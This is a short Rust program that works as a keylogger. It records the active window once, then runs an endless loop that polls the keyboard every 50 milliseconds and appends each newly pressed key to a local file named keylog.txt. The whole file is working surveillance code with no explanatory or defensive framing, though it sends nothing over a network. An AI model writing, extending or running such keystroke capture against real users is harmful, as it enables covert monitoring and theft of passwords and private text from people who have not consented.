use device_query::{DeviceQuery, DeviceState, Keycode};
use active_win_pos_rs::{ActiveWindow, get_active_window};
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::thread;
use std::time::Duration;
fn main() {
    getcurrentprocess();
    getkeystroke()

}
fn getcurrentprocess() -> ActiveWindow {
    match get_active_window(){
        Ok(active_window) => {
            println!("active window: {:#?}",active_window);
            return active_window;
        }
        Err(()) => {
            panic!("Error getting foreground process")
        }
    }
}

fn getkeystroke(){
    let device_state = DeviceState::new();
    let mut previous_keys = vec![];

    loop {
        let keys: Vec<Keycode> = device_state.get_keys();

        if keys != previous_keys {
            for key in &keys {
                if !previous_keys.contains(key) {
                    log_key(key);
                }
            }
            previous_keys = keys;
        }

        thread::sleep(Duration::from_millis(50));
}
}
fn log_key(key: &Keycode) {
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open("keylog.txt")
        .expect("Unable to open file");

    if let Err(e) = writeln!(file, "{:?}", key) {
        eprintln!("Couldn't write to file: {}", e);
    }
}